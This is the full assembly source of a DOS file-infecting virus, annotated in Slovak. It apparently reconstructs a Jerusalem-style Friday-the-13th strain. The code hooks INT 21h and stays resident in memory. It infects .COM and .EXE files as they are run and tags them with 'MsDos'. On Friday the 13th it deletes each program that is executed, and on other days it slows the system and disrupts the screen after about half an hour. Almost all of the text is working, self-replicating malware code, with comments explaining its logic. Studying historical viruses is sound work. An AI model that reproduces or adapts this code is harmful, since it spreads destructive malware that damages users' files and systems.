        TITLE   MS VIR
        PAGE    65,132

FRIDAY      EQU 5

CODE1       SEGMENT AT 0
        ASSUME  CS:CODE1
        ORG 3FCH
PRESUN:
CODE1       ENDS

CODE        SEGMENT PARA PUBLIC
        ASSUME  CS:CODE,DS:CODE
        ORG 0
;-------------------------------------------------
START:      JMP Near Ptr START_COM+100h ;POVODNY OFFSET JE O 100h VACSI
;-------------------------------------------------
        DB  'sU'        ;NEPOUZITE

VIR_NAME    DB  'MsDos'     ;ROZPOZNAVACI RETAZEC VIRUSU
START_ADR   DD  ?       ;STARTOVACIA ADRESA .COM SUBORU
FRI_13      DB  0       ;PRIZNAK PIATKU 13.
DRIV_VAL    DW  0       ;PLATNOST DR.V PRIK.RIADKU(VZDY PLATNE) 
LEN_COM     DW  ?       ;DLZKA POV..COM SUBORU (BEZ VIRUSU)

SAV_I8      DD  ?       ;OBSLUHA POV. INT 8
SAV_I21     DD  ?       ;OBSLUHA POV. INT 21H
SAV_I24     DD  ?       ;OBSLUHA POV. INT 24H

TIME_OUT    DW  ?       ;POCITADLO PRERUSENI 8

H00021      DW  ?       ;POUZIVA SL. 0DEh
H00023      DW  ?       ;   - " -
H00025      DW  ?       ;   - " -
H00027      DW  ?       ;   - " -
H00029      DW  ?       ;   - " -
H0002B      DW  ?       ;   - " -
H0002D      DW  ?       ;   - " -
H0002F      DW  ?       ;   - " -

SAV_ES      DW  ?       ;SEG. ADR. PSP
VIR_SIZE    DW  80H     ;DLZKA REZ. CASTI VIRUSU V PARAGRAFOCH

EPB:                    ;BLOK PARAMETROV PRE SL. 4B
        DW  0       ;SEG. ADR. ENVIRONMENT PRE SL. 4B
        DD  00000080H   ;ADR. PRIKAZOVEHO RIADKU PRE PSP+80H
        DD  0000005CH   ;ADR. FCB PRE PSP+5CH
        DD  0000006CH   ;ADR. FCB PRE PSP+6CH

SAV_SP      DW  ?       ;ULOZENIE PARAMETROV
SAV_SS      DW  ?       ;Z HLAVICKY
SAV_IP      DW  ?       ;SUBORU
SAV_CS      DW  ?       ;TYPU .EXE

SAV_I0FF    DW  ?       ;ULOZENIE 3 BYTE ADRESY
        DB  ?       ;OBSLUHY INT 0FFh
COM_EXE     DB  ?       ;0 --> .COM, INAK .EXE

EXE_HEAD    LABEL   BYTE        ;BUFFER PRE HLAVICKU .EXE SUBORU
SIGN        DB  'MZ'
PART_PAG    DW  ?
PAG_CNT     DW  ?
RELO_CNT    DW  ?
HDR_SIZE    DW  ?
MIN_MEM     DW  ?
MAX_MEM     DW  ?
RELO_SS     DW  ?
EXE_SP      DW  ?
CHK_SUM     DW  ?
EXE_IP      DW  ?
RELO_CS     DW  ?
TABL_OFF    DW  ?
OVERLAY     DW  ?

BUFFER      DB  5 DUP (?)       ;PRE POSLEDNYCH 5 BYTE SUBORU 

F_HANDLE    DW  ?           ;AK 0FFFFh ZIADEN S. NIE JE OTV.
F_ATTR      DW  ?           ;ATRIB. OTVORENEHO SUBORU
F_DATE      DW  ?           ;DATUM      - " -
F_TIME      DW  ?           ;CAS        - " -

PAGE_LEN    DW  200H            ;DLZKA STRANKY .EXE SUBORU
PAR_LEN     DW  10H         ;DLZKA PARAGRAFU

LEN_EXE     DD  ?           ;DLZKA POV. EXE SUBORU
F_SPEC      DD  ?           ;ADRESA RET. SO SPEC. SUBORU

TEXT_COM    DB  'COMMAND.COM'       ;MENO PRIKAZOVEHO SUBORU
MEM_ALL?    DW  ?           ;0-PAM. NEBOLA ALOK.,INAK BOLA 

        DW  0,0         ;NEPOUZITE
;------------------------------------------------------------
START_COM   PROC    FAR
        CLD 
        MOV AH,0E0h
        INT 21h         ;JE VIRUS INSTALOVANY?
        CMP AH,0E0h
        JNB INST_VIR        ;NAINSTALUJ
        CMP AH,03h
        JB  INST_VIR        ;NAINSTALUJ
        MOV AH,0DDh
        MOV DI,0100h
        MOV SI,0710h
        ADD SI,DI
        MOV CX,CS:[DI+OFFSET LEN_COM]
        INT 21h         ;VIRUS JE V DOS, POSUN POV. COM
INST_VIR:   MOV AX,CS
        ADD AX,0010h
        MOV SS,AX
        MOV SP,OFFSET STACK1
        PUSH    AX
        MOV AX,OFFSET START_EXE
        PUSH    AX
        RET             ;SKOK NA START_EXE
START_COM   ENDP
;-------------------------------------------------
START_EXE:  CLD
        PUSH    ES          ;SEGMENT_OPERATION
        MOV CS:SAV_ES,ES        ;ULOZI BAZOVU ADR. PSP
        MOV CS:Word Ptr EPB+4,ES
        MOV CS:Word Ptr EPB+8,ES
        MOV CS:Word Ptr EPB+12,ES
        MOV AX,ES
        ADD AX,0010h
        ADD CS:SAV_CS,AX        ;ULOZI BAZOVU ADRESU VIRUSU
        ADD CS:SAV_SS,AX
        MOV AH,0E0h
        INT 21h         ;JE VIRUS INSTALOVANY?
        CMP AH,0E0h
        JNB INST_V3         ;NIE JE, POKRACUJ V INSTALOVANI
        CMP AH,03h
        POP ES          ;SEGMENT_OPERATION
        MOV SS,CS:SAV_SS        ;NASTAV SS A SP PODLA
        MOV SP,CS:SAV_SP        ;POVODNEJ .EXE HLAVICKY
        JMP CS:Dword Ptr SAV_IP ;JMP NA ZACIATOK .EXE PROGRAMU
;-------------------------------------------------
INST_V3:    XOR AX,AX
        MOV ES,AX               ;ES <-- 0
        MOV AX,ES:03FCh
        MOV Word Ptr CS:SAV_I0FF,AX
        MOV AL,ES:03FEh
        MOV Byte Ptr CS:SAV_I0FF+2,AL
        MOV Word Ptr ES:03FCh,0A5F3h    ;REPZ MOVSW
        MOV Byte Ptr ES:03FEh,0CBh      ;RETF
        POP AX          ;AX <-- SEG. ADR. PSP
        ADD AX,0010h
        MOV ES,AX           ;ES <-- SEG. ADR. PSP + 10
        PUSH    CS
        POP DS          ;DS <-- SEG. ADR. VIRUSU
        MOV CX,0710h        ;DLZKA VIRUSU
        SHR CX,1            ;/2 (DLZKA V SLOVACH)
        XOR SI,SI           ;SI <-- 0
        MOV DI,SI           ;DI <-- 0
        PUSH    ES          ;ULOZ NAVRATOVU ADRESU
        MOV AX,OFFSET INST_V4
        PUSH    AX
        JMP Far Ptr PRESUN      ;JMP 0:3FCH

;Program na adrese 0:3FCh presunie virus na zaciatok programu (v .EXE suboroch
;je ulozeny na konci). Ak ide o .COM subor nestane sa nic.
;-------------------------------------------------
INST_V4:    MOV AX,CS
        MOV SS,AX
        MOV SP,OFFSET STACK1
        XOR AX,AX
        MOV DS,AX
        MOV AX,Word Ptr CS:SAV_I0FF
        MOV DS:03FCh,AX
        MOV AL,Byte Ptr CS:SAV_I0FF+2
        MOV DS:03FEh,AL     ;OBNOVENIE INT 0FFH
        MOV BX,SP           ;BX <-- ADR. KONCA VIRUSU
        MOV CL,04h
        SHR BX,CL           ;/16 (ADR. KONCA V PAR.)
        ADD BX,+10h         ;DLZKA PSP+VIRUSU V PAR.
        MOV CS:VIR_SIZE,BX
        MOV AH,4Ah
        MOV ES,CS:SAV_ES        ;SEG. ADR. PSP
        INT 21h         ;ZMEN DL. PAM. BLOKU NA VIR_SIZE
        MOV AX,3521h
        INT 21h         ;Interrupt Vector
        MOV Word Ptr CS:SAV_I21,BX  ;ULOZ ADRESU
        MOV Word Ptr CS:SAV_I21+2,ES;POVODNEHO INT 21
        PUSH    CS
        POP DS
        MOV DX,OFFSET I21_VIR
        MOV AX,2521h
        INT 21h         ;ZMEN ADR. INT 21 NA I21_VIR
        MOV ES,SAV_ES       ;SEG. ADR. PSP
        MOV ES,ES:[002Ch]       ;SEG. ADR. DOS ENVIRONMENT 
        XOR DI,DI
        MOV CX,7FFFh
        XOR AL,AL
L1:     REPNZ   SCASB  
        CMP ES:[DI],AL      ;VYHLADA DVE ZA
        LOOPNZ  L1          ;SEBOU IDUCE NULY
        MOV DX,DI
        ADD DX,+03h         ;ZAC.STR.S CESTOU A MENOM PROG.
        MOV AX,4B00h        ;SLUZBA EXEC
        PUSH    ES
        POP DS
        PUSH    CS
        POP ES          ;ADRESA
        MOV BX,OFFSET EPB       ;EPB
        PUSH    DS
        PUSH    ES
        PUSH    AX
        PUSH    BX
        PUSH    CX
        PUSH    DX
        MOV AH,2Ah
        INT 21h         ;Date
        MOV Byte Ptr CS:FRI_13,00h  ;NIE JE PIATOK 13.!
        CMP CX,1987         ;JE ROK 1987?
        JZ  NOINS_I8        ;SKOK AK JE
        CMP AL,FRIDAY       ;JE PIATOK?
        JNZ INS_I8          ;SKOK AK NIE JE
        CMP DL,13           ;JE 13.?
        JNZ INS_I8          ;SKOK AK NIE JE
        INC Byte Ptr CS:FRI_13  ;JE PIATOK 13.!
        JMP Short NOINS_I8
;-------------------------------------------------
        NOP
 
INS_I8:     MOV AX,3508h
        INT 21h         ;Interrupt Vector
        MOV Word Ptr CS:SAV_I8,BX   ;ULOZ ADRESU
        MOV Word Ptr CS:SAV_I8+2,ES ;POVODNEHO I8
        PUSH    CS
        POP DS
        MOV TIME_OUT,7E90h      ;29 min a  42 s 
        MOV AX,2508h
        MOV DX,OFFSET I8_VIR
        INT 21h         ;Set Intrpt Vector 8 to I8_VIR
NOINS_I8:   POP DX
        POP CX
        POP BX
        POP AX
        POP ES
        POP DS
        PUSHF
        CALL    CS:Dword Ptr SAV_I21    ;VOLANIE ORIG. I21 SL.4B00

;Tu sa vykona samotny program, ktory je nainfikovany virusom

        PUSH    DS
        POP ES
        MOV AH,49h
        INT 21h         ;UVOLNI PAMAT AL. PRE PROGRAM
        MOV AH,4Dh
        INT 21h         ;NAVRATOVY KOD ULOZ DO AL
        MOV AH,31h
        MOV DX,0600h        ;DLZKA REZ. CASTI VIRUSU
        MOV CL,04h
        SHR DX,CL           ;/16 (DLZKA V PAR.)
        ADD DX,+10h         ;+ DLZKA PSP
        INT 21h         ;ZREZIDENTNI VIRUS
;-------------------------------------------------
I24_VIR:    XOR AL,AL
        IRET    
;-------------------------------------------------
;Obsluha prerusenia 8. Sem je I8 presmerovane len ak nie je rok 1987 a
;nie je piatok 13.
;Ak je I8 presmerovane, tak po 29 min a 42 s sa zmeni obrazovka a podstatne sa
;spomali cinnost systemu.

I8_VIR:     CMP CS:TIME_OUT,+02h    ;BUDE KONCIT TIME_OUT?
        JNZ I8_1            ;SKOK AK NEBUDE
        PUSH    AX
        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    BP
        MOV AX,0602h        ;POSUN OKNO HORE O 2 RIADKY
        MOV BH,87h          ;VOLNE RIADKY BUDU BLIKAT
        MOV CX,0505h        ;LAVY HORNY ROH: 5,5
        MOV DX,1010h        ;PRAVY DOLNY ROH: 10,10
        INT 10h         ;Scroll Window Up
        POP BP
        POP DX
        POP CX
        POP BX
        POP AX
I8_1:       DEC Word Ptr CS:TIME_OUT
        JNZ I8_2            ;SKOK AK NEDOPOCITAL NA 0
        MOV CS:TIME_OUT,0001h
        PUSH    AX
        PUSH    CX
        PUSH    SI
        MOV CX,4001h
        REPZ    LODSB           ;CAKACIA SLUCKA
        POP SI
        POP CX
        POP AX
I8_2:       JMP CS:Dword Ptr SAV_I8 ;SKOK NA ORIG. I8
;-------------------------------------------------
;   Obsluha prerusenia 21.
;   Obsluhuje sluzby 4B00h, 0DDh, 0DEh a 0E0h.
;- Sluzba 4B00h: ak je FRI_13=1 zmaze zavadzany subor
;  ak je FRI_13=0 nainfikuje zavadzany subor
;- Sluzba 0DEh je definovana, no samotny virus ju nikdy nevola. Nie je ani
;  blizsie analyzovana.
;- Sluzba 0DDh presune blok pamate a spusti program od adresy 100h v segmente
;  odkial bolo INT 21 volane:
;   vstup AH = 0DDh   CX - pocet prenasanych byteov
;   DS:SI - adr. zdrojoveho bloku   ES:DI - adr. cieloveho bloku
;- Sluzba 0E0h vracia v AX 0300h ak je virus instalovany,

I21_VIR:    PUSHF
        CMP AH,0E0h
        JNZ I21_1       ;SKOK AK TO NIE JE SL. 0E0H
        MOV AX,0300h    ;NAVRATOVY KOD SL. 0E0H
        POPF    
        IRET    
I21_1:      CMP AH,0DDh
        JZ  SER_DD      ;SKOK AK TO JE SL. 0DDH
        CMP AH,0DEh
        JZ  SER_DE      ;SKOK AK TO JE SL. 0DEH
        CMP AX,4B00h
        JNZ I21     ;SKOK AK TO NIE JE SL. 4B00H
        JMP SER_4B00    ;SKOK AK TO JE SL. 4B00H
;-------------------------------------------------
I21:        POPF
        JMP CS:Dword Ptr SAV_I21    ;SKOK NA ADR. POV. I21
;-------------------------------------------------
SER_DD:     POP AX
        POP AX
        MOV AX,0100h
        MOV Word Ptr CS:START_ADR,AX    ;NASTAVI NAVRATOVU
        POP AX          ;ADRESU NA 100H V SEGMENTE
        MOV Word Ptr CS:START_ADR+2,AX  ;ODKIAL BOLO I21 VOLANE
        REPZ    MOVSB           ;VYKONAJ PRESUN
        POPF
        MOV AX,CS:DRIV_VAL
        JMP CS:Dword Ptr START_ADR
;-------------------------------------------------
SER_DE:     ADD SP,+06h
        POPF
        MOV AX,CS
        MOV SS,AX
        MOV SP,0710h
        PUSH    ES
        PUSH    ES
        XOR DI,DI
        PUSH    CS
        POP ES
        MOV CX,0010h
        MOV SI,BX
        MOV DI,OFFSET H00021
        REPZ    MOVSB
        MOV AX,DS
        MOV ES,AX
        MUL CS:PAR_LEN
        ADD AX,CS:H0002B
        ADC DX,+00h
        DIV CS:PAR_LEN
        MOV DS,AX
        MOV SI,DX
        MOV DI,DX
        MOV BP,ES
        MOV BX,CS:H0002F
        OR  BX,BX
        JZ  H003ED
H003DA:     MOV CX,8000h
        REPZ    MOVSW  
        ADD AX,1000h
        ADD BP,1000h
        MOV DS,AX
        MOV ES,BP
        DEC BX
        JNZ H003DA
H003ED:     MOV CX,CS:H0002D
        REPZ    MOVSB  
        POP AX
        PUSH    AX
        ADD AX,0010h
        ADD CS:H00029,AX
        ADD CS:H00025,AX
        MOV AX,CS:H00021
        POP DS
        POP ES
        MOV SS,CS:H00029
        MOV SP,CS:H00027
        JMP Dword Ptr CS:H00023
;-------------------------------------------------
DEL_FILE:   XOR CX,CX
        MOV AX,4301h
        INT 21h         ;NASTAV ATTR ABY SA DAL ZMAZAT
        MOV AH,41h
        INT 21h         ;ZMAZ SUBOR 
        MOV AX,4B00h
        POPF
        JMP CS:Dword Ptr SAV_I21    ;SKOK NA POV. I21
;-------------------------------------------------
SER_4B00:   CMP Byte Ptr CS:FRI_13,01h  ;JE PIATOK 13.?
        JZ  DEL_FILE        ;SKOK AK ANO
        MOV CS:F_HANDLE,0FFFFh
        MOV CS:MEM_ALL?,0000h
        MOV Word Ptr CS:F_SPEC,DX   ;ULOZ ADR. SPECIFIKACIE
        MOV Word Ptr CS:F_SPEC+2,DS ;SUBORU
        PUSH    AX
        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    SI
        PUSH    DI
        PUSH    DS
        PUSH    ES
        CLD
        MOV DI,DX           ;DI <-- ZACIATOK F_SPEC STRINGU
        XOR DL,DL           ;POUZI AKTUALNY DISK
        CMP Byte Ptr [DI+01h],':'   ;JE SPECIFIKOVANY DISK?
        JNZ I21_2           ;AK NIE, POUZI AKTUALNY
        MOV DL,[DI]         ;ZISTI CISLO SPEC. DISKU
        AND DL,1Fh          ;A ULOZ HO DO DL
I21_2:      MOV AH,36h
        INT 21h         ;ZISTI MIESTO NA DISKU
        CMP AX,0FFFFh
        JNZ I21_3           ;SKOK AK NEBOL CHYBNY DRIVE
I21_4:      JMP ORIG_I21        ;SKOK PRI CHYBE
;-------------------------------------------------
I21_3:      MUL BX
        MUL CX          ;DX:AX <-- VOLNYCH BYTEOV
        OR  DX,DX           ;JE TO VIAC AKO 0FFFFH?
        JNZ ENOUGH_SP       ;SKOK AK ANO
        CMP AX,0710h        ;JE TO VIAC AKO 710H?
        JB  I21_4           ;SKOK AK NIE
ENOUGH_SP:  MOV DX,Word Ptr CS:F_SPEC
        PUSH    DS
        POP ES
        XOR AL,AL
        MOV CX,0041h
        REPNZ   SCASB           ;DI <-- ADRESA KONCA RET.+1
        MOV SI,Word Ptr CS:F_SPEC
I21_5:      MOV AL,[SI]         ;AL <-- ZNAK
        OR  AL,AL           ;JE TO POSLEDNY ZNAK?
        JZ  I21_6           ;SKOK AK ANO
        CMP AL,'a'          ;JE TO
        JB  UP_CASE         ;MALE PISMENO
        CMP AL,'z'          ;SKOK NA
        JA  UP_CASE         ;UP_CASE AK NIE
        SUB Byte Ptr [SI],20h   ;ZMEN MALE NA VELKE
UP_CASE:    INC SI          ;DALSI ZNAK
        JMP Short I21_5
;-------------------------------------------------
I21_6:      MOV CX,000Bh
        SUB SI,CX
        MOV DI,OFFSET TEXT_COM
        PUSH    CS
        POP ES
        MOV CX,000Bh
        REPZ    CMPSB           ;JE TO COMMAND.COM 
        JNZ I21_7           ;SKOK AK NIE
        JMP ORIG_I21        ;COMMAND.COM NEZMENI!
;-------------------------------------------------
I21_7:      MOV AX,4300h
        INT 21h         ;CITAJ ATRIBUTY SUBORU
        JB  ERR1            ;SKOC PRI CHYBE
        MOV CS:F_ATTR,CX        ;ULOZ ATRIBUTY SUBORU
ERR1:       JB  ERR2            ;SKOC PRI CHYBE
        XOR AL,AL
        MOV CS:COM_EXE,AL       ;NASTAV PRIZNAK NA .COM
        PUSH    DS
        POP ES
        MOV DI,DX
        MOV CX,0041h
        REPNZ   SCASB           ;DI <-- KONEC RETAZCA+1
        CMP Byte Ptr [DI-2],'M'
        JZ  I21_8           ;JE TO .COM
        CMP Byte Ptr [DI-2],'m'
        JZ  I21_8           ;JE TO .COM
        INC Byte Ptr CS:[004Eh] ;JE TO .EXE, ZMEN PRIZNAK
I21_8:      MOV AX,3D00h
        INT 21h         ;OTVORI SUBOR NA CITANIE
ERR2:       JB  ERR3            ;SKOC PRI CHYBE
        MOV CS:F_HANDLE,AX      ;ULOZ FILE HANDLE
        MOV BX,AX
        MOV AX,4202h
        MOV CX,0FFFFh
        MOV DX,0FFFBh       ;POSUN POINTER V SUBORE
        INT 21h         ;NA 5. POZICIU OD KONCA
        JB  ERR2            ;SKOC PRI CHYBE
        ADD AX,0005h
        MOV CS:LEN_COM,AX       ;ULOZ DLZKU SUBORU
        MOV CX,5            ;CX <-- DLZKA MENA VIRUSU
        MOV DX,OFFSET BUFFER
        MOV AX,CS
        MOV DS,AX
        MOV ES,AX
        MOV AH,3Fh          ;CITAJ POSLEDNYCH 5 ZNAKOV
        INT 21h         ;ZO SUBORU DO BUFFER
        MOV DI,DX
        MOV SI,OFFSET VIR_NAME
        REPZ    CMPSB           ;JE NA KONCI SUBORU MENO VIRUSU?
        JNZ I21_9           ;SKOC AK NIE JE
        MOV AH,3Eh
        INT 21h         ;UZAVRI SUBOR
        JMP ORIG_I21        ;A SKOC NA POVODNE I21
;-------------------------------------------------
I21_9:      MOV AX,3524h
        INT 21h         ;Interrupt Vector
        MOV Word Ptr SAV_I24,BX
        MOV Word Ptr SAV_I24+2,ES   ;ULOZ POV. ADR. I24
        MOV DX,OFFSET I24_VIR
        MOV AX,2524h
        INT 21h         ;PRESMERUJ I24 NA I24_VIR
        LDS DX,F_SPEC
        XOR CX,CX
        MOV AX,4301h
        INT 21h         ;VYNULUJ ATRIBUTY SUBORU
ERR3:       JB  ERR4            ;SKOC PRI CHYBE
        MOV BX,CS:F_HANDLE
        MOV AH,3Eh
        INT 21h         ;UZAVRI SUBOR
        MOV CS:F_HANDLE,0FFFFh  ;NIE JE OTVORENY ZIADNY SUBOR
        MOV AX,3D02h
        INT 21h         ;OTVOR SUBOR PRE CITANIE A ZAPIS
        JB  ERR4            ;SKOC PRI CHYBE
        MOV CS:F_HANDLE,AX      ;ULOZ FILE HANDLE
        MOV AX,CS
        MOV DS,AX
        MOV ES,AX
        MOV BX,F_HANDLE
        MOV AX,5700h
        INT 21h         ;ZISTI DATUM A CAS SUBORU
        MOV F_DATE,DX       ;ULOZ DATUM
        MOV F_TIME,CX       ;ULOZ CAS
        MOV AX,4200h
        XOR CX,CX
        MOV DX,CX
        INT 21h         ;POSUN POINTER NA ZAC. SUBORU
ERR4:       JB  ERR5            ;SKOC PRI CHYBE
        CMP COM_EXE,00h     ;JE TO .COM?
        JZ  COM         ;SKOC AK ANO!
        JMP Short EXE       ;JE TO .EXE!
;-------------------------------------------------
        NOP
COM:        MOV BX,1000h
        MOV AH,48h
        INT 21h         ;ALOKUJ 10000H BYTEOV PAMATI
        JNB I21_10          ;SKOC AK SA ALOKOVANIE PODARILO
        MOV AH,3Eh
        MOV BX,F_HANDLE
        INT 21h         ;UZAVRI SUBOR
        JMP ORIG_I21        ;SKOC NA ORIGINALNE I21
;-------------------------------------------------
I21_10:     INC MEM_ALL?
        MOV ES,AX           ;SEG. ADR. ALOKOVANEHO BUFFRA
        XOR SI,SI           ;SI <-- 0
        MOV DI,SI           ;DI <-- 0
        MOV CX,0710h        ;DLZKA VIRUSU
        REPZ    MOVSB           ;PRESUN VIRUS DO BUFFRA
        MOV DX,DI           ;1. BYTE ZA VIRUSOM V BUFF.
        MOV CX,LEN_COM
        MOV BX,F_HANDLE
        PUSH    ES
        POP DS
        MOV AH,3Fh          ;NACITAJ CELY .COM SUBOR
        INT 21h         ;DO BUFFRA
ERR5:       JB  ERR6            ;SKOC PRI CHYBE
        ADD DI,CX           ;1. BYTE ZA KONCOM NAC. SUBORU
        XOR CX,CX
        MOV DX,CX
        MOV AX,4200h
        INT 21h         ;POSUN POINTER NA ZAC. SUBORU
        MOV SI,OFFSET VIR_NAME
        MOV CX,0005h
        REPZ    MOVS Byte Ptr ES:0,Byte Ptr CS:0
                        ;NA KONIEC BUFFRA PRESUN 'MsDos'
        MOV CX,DI           ;DLZKA SUBORU S VIRUSOM
        XOR DX,DX
        MOV AH,40h
        INT 21h         ;ZAPIS SUBOR S VIRUSOM NA DISK
ERR6:       JB  ERR7            ;SKOC PRI CHYBE
        JMP I21_11          ;CHYBA SA NEVYSKYTLA
;-------------------------------------------------
EXE:        MOV CX,001Ch        ;DLZKA .EXE HEAD
        MOV DX,OFFSET EXE_HEAD
        MOV AH,3Fh
        INT 21h         ;PRECITAJ HLAVICKU .EXE SUBORU
ERR7:       JB  ERR8            ;SKOC PRI CHYBE
        MOV CHK_SUM,1984h
        MOV AX,RELO_SS
        MOV SAV_SS,AX
        MOV AX,EXE_SP
        MOV SAV_SP,AX
        MOV AX,EXE_IP
        MOV SAV_IP,AX
        MOV AX,RELO_CS
        MOV SAV_CS,AX
        MOV AX,PAG_CNT
        CMP PART_PAG,0      ;JE POSLEDNA STRANKA NECELA?
        JZ  I21_12          ;SKOC AK JE CELA
        DEC AX
I21_12:     MUL PAGE_LEN        ;DX:AX <-- PAG_CNT * PAGE_LEN
        ADD AX,PART_PAG
        ADC DX,+00h         ;+ PART_PAG
        ADD AX,000Fh
        ADC DX,+00h
        AND AX,0FFF0h       ;DX:AX <-- DL. ZAROVNANA NA PAR.
        MOV Word Ptr LEN_EXE,AX ;ULOZ DLZKU NENAKAZENEHO
        MOV Word Ptr LEN_EXE+2,DX   ;.EXE SUBORU
        ADD AX,0710h
        ADC DX,+00h         ;DX:AX <-- DLZKA NENAKAZ.+VIRUS
ERR8:       JB  ERR9            ;SKOC PRI CHYBE
        DIV PAGE_LEN        ;AX<--DLZKA V STR. DX<--ZVYSOK
        OR  DX,DX
        JZ  I21_13          ;SKOC PRI ZVYSKU 0
        INC AX
I21_13:     MOV PAG_CNT,AX      ;DO HLAVICKY .EXE SUBORU
        MOV PART_PAG,DX     ;ULOZ DLZKU SUBORU S VYRUSOM
        MOV AX,Word Ptr LEN_EXE
        MOV DX,Word Ptr LEN_EXE+2
        DIV PAR_LEN         ;AX <-- DLZKA POV. SUBORU V PAR.
        SUB AX,HDR_SIZE     ;- DLZKA .EXE HLAVICKY
        MOV RELO_CS,AX      ;ULOZ CS VIRUSU AKO STARTOVACI
        MOV EXE_IP,OFFSET START_EXE ;ULOZ START. OFFSET VIRUSU
        MOV RELO_SS,AX      ;ULOZ SS VIRUSU
        MOV EXE_SP,OFFSET STACK2    ;ULOZ SP VIRUSU
        XOR CX,CX
        MOV DX,CX
        MOV AX,4200h
        INT 21h         ;NASTAV UKAZOVATEL NA ZAC.SUBORU
ERR9:       JB  ERR10           ;SKOC PRI CHYBE
        MOV CX,001Ch        ;DLZKA .EXE HLAVICKY
        MOV DX,OFFSET EXE_HEAD
        MOV AH,40h
        INT 21h         ;ZAPIS NOVU .EXE HLAVICKU
ERR10:      JB  ERR11           ;SKOC PRI CHYBE
        CMP AX,CX           ;ZAPISANA CELA HLAVICKA?
        JNZ I21_11          ;SKOC AK NIE
        MOV DX,Word Ptr LEN_EXE
        MOV CX,Word Ptr LEN_EXE+2
        MOV AX,4200h        ;NASTAV POINTER NA KONIEC
        INT 21h         ;POVODNEHO .EXE SUBORU
ERR11:      JB  I21_11          ;SKOC PRI CHYBE
        XOR DX,DX
        MOV CX,0710h
        MOV AH,40h
        INT 21h         ;ZAPIS VIRUS NA KONIEC SUBORU

;Tu spravil programator chybu, lebo uplne na koniec zabudol zapisat rozpoznavaci
;text 'MsDos'. Tym padom sa virus na .EXE subory nahrava viackrat.

I21_11:     CMP CS:MEM_ALL?,0       ;BOLA ALOKOVANA PAMAT?
        JZ  I21_14          ;SKOC AK NEBOLA
        MOV AH,49h
        INT 21h         ;UVOLNI ALOKOVANU PAMAT
I21_14:     CMP CS:F_HANDLE,0FFFFH  ;BOL OTVORENY SUBOR?
        JZ  ORIG_I21        ;SKOC AK NEBOL
        MOV BX,CS:F_HANDLE
        MOV DX,CS:F_DATE
        MOV CX,CS:F_TIME
        MOV AX,5701h
        INT 21h         ;NASTAV POVODNY DATUM A CAS
        MOV AH,3Eh
        INT 21h         ;UZAVRI SUBOR
        LDS DX,CS:F_SPEC
        MOV CX,CS:F_ATTR
        MOV AX,4301h
        INT 21h         ;NASTAV POVODNE ATRIBUTY
        LDS DX,CS:SAV_I24
        MOV AX,2524H
        INT 21h         ;NASTAV POVODNE INT 24
ORIG_I21:   POP ES
        POP DS
        POP DI
        POP SI
        POP DX
        POP CX
        POP BX
        POP AX
        POPF
        JMP CS:Dword Ptr SAV_I21
;-------------------------------------------------
        DB  0
        DW  85H DUP(?)
STACK1      DW  8 DUP(?)
STACK2:
CODE        ENDS
        END
